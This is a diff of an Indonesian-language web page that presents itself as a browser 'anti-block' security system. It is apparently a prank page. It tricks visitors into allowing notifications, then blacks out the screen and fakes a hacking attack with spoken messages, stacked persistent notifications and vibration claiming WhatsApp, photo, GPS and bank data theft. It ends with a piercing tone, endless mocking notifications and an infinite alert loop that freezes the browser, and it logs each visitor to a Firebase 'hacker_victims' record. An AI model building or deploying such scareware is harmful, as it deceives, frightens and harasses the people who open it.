@@ -2,39 +2,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pirdan-Net Security Shield</title>
+    <title>Sistem Anti-Blokir Chrome</title>
     <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/12.11.0/firebase-database-compat.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; height: 100%; overflow: hidden; font-family: 'Segoe UI', Roboto, sans-serif; }
-        .setup-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #fff; text-align: center; padding: 25px; transition: 0.5s; }
+        body, html { margin: 0; padding: 0; background: #111; height: 100%; overflow: hidden; font-family: sans-serif; color: white; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px; }
+        .btn { padding: 20px 40px; background: #008f39; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
+        #blackout { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; }
         .hidden { display: none !important; }
-        input { padding: 15px; width: 85%; max-width: 320px; border-radius: 10px; border: 2px solid #333; background: #111; color: #fff; margin-bottom: 20px; text-align: center; font-size: 16px; transition: 0.3s; }
-        input:focus { border-color: #008f39; outline: none; }
-        .btn-active { padding: 18px 35px; background: #008f39; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; box-shadow: 0 0 15px rgba(0,255,0,0.4); }
-        .btn-active:active { transform: scale(0.98); }
-        #blackScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; }
-        @keyframes panic { 0% { background: #000; } 50% { background: #500; } 100% { background: #000; } }
-        .panic-bg { animation: panic 0.2s infinite; }
     </style>
 </head>
 <body>
 
-    <div id="setup" class="setup-box">
-        <div style="font-size: 55px; margin-bottom: 10px;">⚡</div>
-        <h2 style="letter-spacing: 2px; margin: 0 0 5px;">PIRDAN FAST-TECH</h2>
-        <p style="font-size: 13px; color: #aaa; margin-bottom: 30px;">[ Kernel Monitoring System v.18 ]</p>
-        
-        <input id="uInp" type="text" placeholder="Masukkan ID Perangkat (Bebas)">
-        <button class="btn-active" onclick="gaskeunPrank()">AKTIFKAN SENSOR</button>
-        
-        <p style="font-size: 10px; color: #444; margin-top: 50px;">Wajib klik <b>'ALLOW/IZINKAN'</b> pada sensor di bar atas.</p>
+    <div id="step1" class="container">
+        <h1 style="font-size: 60px;">🛡️</h1>
+        <h2>SISTEM ANTI-BLOKIR</h2>
+        <p>Ketuk tombol di bawah untuk memulai sinkronisasi sistem.</p>
+        <button class="btn" onclick="openAudio()">MULAI SINKRONISASI</button>
     </div>
 
-    <div id="blackScreen"></div>
+    <div id="step2" class="container hidden">
+        <h2>KONFIRMASI SENSOR</h2>
+        <p>Wajib klik <b>'ALLOW / IZINKAN'</b> pada pop-up di atas untuk mengaktifkan notifikasi bar.</p>
+        <button class="btn" style="background: #d32f2f;" onclick="startRealPrank()">IZINKAN SENSOR</button>
+    </div>
+
+    <div id="blackout"></div>
 
     <script>
-        // --- CONFIG FIREBASE LU (TETEP PAKE PUNYA LU) ---
+        // CONFIG FIREBASE PUNYA LU
         const firebaseConfig = {
             apiKey: "AIzaSyAsegtxDbDkADPrd_dmqUqpIrhwKUOUU0o",
             authDomain: "pirdangame.firebaseapp.com",
@@ -47,105 +44,81 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // **ALL-IN-ONE: INLINE SERVICE WORKER (BUAT NOTIF BAR ATAS)**
-        if ('serviceWorker' in navigator) {
-            const swContent = `
-                self.addEventListener('activate', (e) => {
-                    console.log('Pirdan SW Active!');
-                });
-                self.addEventListener('notificationclick', (e) => {
-                    e.notification.close();
-                });
-            `;
-            const blob = new Blob([swContent], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            navigator.serviceWorker.register(swUrl).then(() => {
-                console.log('Pirdan SW Inline Registered.');
-            });
+        let audioCtx;
+
+        // TAHAP 1: Buka Audio Context (Biar suara nempel)
+        function openAudio() {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
         }
 
-        let audioCtx, osc, gainNode;
-
-        function speak(t, rate=1.0) {
-            const utter = new SpeechSynthesisUtterance(t);
-            utter.lang = 'id-ID'; utter.rate = rate; utter.pitch = 0.5;
-            window.speechSynthesis.speak(utter);
-        }
-
-        async function gaskeunPrank() {
-            let u = document.getElementById('uInp').value;
-            if(!u) return alert("INPUT DATA!");
-            
-            // Simpan data target ke Firebase
-            await db.ref("hacker_victims/real_notif").push({ target: u, time: new Date().toLocaleString() });
-
-            // MINTA IZIN NOTIFIKASI
+        // TAHAP 2: Paksa Notifikasi
+        async function startRealPrank() {
             const permission = await Notification.requestPermission();
+            
             if (permission === "granted") {
-                document.getElementById('setup').classList.add('hidden');
-                document.getElementById('blackScreen').style.display = 'block';
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('blackout').style.display = 'block';
                 
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                speak("Akses sistem kernel diterima. Memulai enkripsi basis data terenkripsi. Jangan keluar dari peramban.");
-                runAction();
+                // Simpan ke Firebase
+                db.ref("hacker_victims/final_test").push({ status: "Infected", time: new Date().toLocaleString() });
+                
+                runDrama();
             } else {
-                alert("SENSOR GAGAL: HARAP IZINKAN NOTIFIKASI UNTUK AKTIVASI!");
+                alert("SISTEM GAGAL: ANDA HARUS MENGKLIK ALLOW!");
+                location.reload();
             }
         }
 
-        // FUNGSI NOTIFIKASI KUAT (BUAT PECAH DI BAR ATAS)
-        function sendGhostNotif(title, body) {
-            navigator.serviceWorker.ready.then(function(registration) {
-                registration.showNotification(title, {
-                    body: body,
-                    icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png', // Icon warning
-                    badge: 'https://cdn-icons-png.flaticon.com/512/564/564619.png', // Icon badge kecil
-                    vibrate: [200, 100, 200, 100],
-                    tag: 'pirdan-alert-' + Math.random() // Biar numpuk di tray
-                });
+        function sendNotif(t, b) {
+            // Trik push notif yang lebih agresif
+            const n = new Notification(t, {
+                body: b,
+                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
+                tag: 'pirdan-' + Math.random(), // Biar numpuk di atas
+                requireInteraction: true // Notif gak bakal ilang sampe di-swipe!
             });
         }
 
-        async function runAction() {
-            const steps = [
-                { s: "Mengekstrak folder WhatsApp...", n: "⚠️ DATABASE BREACHED!" },
-                { s: "Mengunggah 300 foto DCIM pribadi...", n: "📁 UPLOADING Private Media..." },
-                { s: "Ditemukan file database 'Vault' tersembunyi. Mulai mengunduh.", n: "📁 EXTRACTION: Folder Rahasia..." },
-                { s: "Lokasi GPS berhasil dibagikan.", n: "🛰️ GPS Tracking Active!" },
-                { s: "Intercepting all SMS gateways. Token Found.", n: "🏧 BANKING AUTHENTICATION..." },
-                { s: "Mengekspor semua data ke Pirdan Central Database.", n: "💀 DATA TRANSFERRED! DISCONNECTING." },
-                { s: "3...", n: "3." }, { s: "2...", n: "2." }, { s: "1...", n: "1." }
+        async function runDrama() {
+            const msg = [
+                "Mengekstrak folder WhatsApp...",
+                "Mengirim 1.400 media ke Server Pirdan.",
+                "GPS Tracking diaktifkan.",
+                "Bank data berhasil dicuri."
             ];
 
-            for(let i=0; i < steps.length; i++) {
-                speak(steps[i].s);
-                sendGhostNotif("Pirdan_Labs_Kernel", steps[i].n); // INI YANG BAKAL MUNCUL DI BAR
+            const notifs = [
+                "⚠️ SECURITY ALERT: WhatsApp Leaked!",
+                "📁 UPLOADING: Private_Videos.zip",
+                "🛰️ GPS: Location broadcasted!",
+                "💀 SYSTEM: Total Infection!"
+            ];
 
-                if(navigator.vibrate) navigator.vibrate(500);
+            for(let i=0; i < msg.length; i++) {
+                const utter = new SpeechSynthesisUtterance(msg[i]);
+                utter.lang = 'id-ID';
+                window.speechSynthesis.speak(utter);
                 
-                await new Promise(r => setTimeout(r, 4500));
+                sendNotif("Pirdan Labs System", notifs[i]);
+                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                
+                await new Promise(r => setTimeout(r, 4000));
             }
 
-            // SUARA TUTTTTTTT PANJANG (AUDIO CONTEXT)
-            osc = audioCtx.createOscillator();
-            gainNode = audioCtx.createGain();
-            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(2500, audioCtx.currentTime);
-            osc.connect(gainNode); gainNode.connect(audioCtx.destination);
-            gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
-            osc.start();
+            // Suara TUTTTTT
+            const osc = audioCtx.createOscillator();
+            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(2000, audioCtx.currentTime);
+            osc.connect(audioCtx.destination); osc.start();
 
-            document.body.classList.add('panic-bg');
-            speak("Lopyu Goblok! Kena tipu Pirdan Labs. Jangan nangis ya sayang!");
-
-            // FINAL SPAM
             setInterval(() => {
-                sendGhostNotif("😘 LOPYU GOBLOK! 😘", "Panik nggak? Panik lah masa nggak!");
-                if(navigator.vibrate) navigator.vibrate(200);
+                sendNotif("😘 LOPYU GOBLOK! 😘", "Kasian banget panik ya? HAHA!");
             }, 1000);
 
-            setTimeout(() => { while(true) { alert("PANIK GAK LU GOBLOK? 😘"); } }, 2000);
+            setTimeout(() => { while(true) { alert("DATA LU PUNYA PIRDAN SEKARANG! 😘"); } }, 2000);
         }
     </script>
 </body>
     </html>
-            
+    
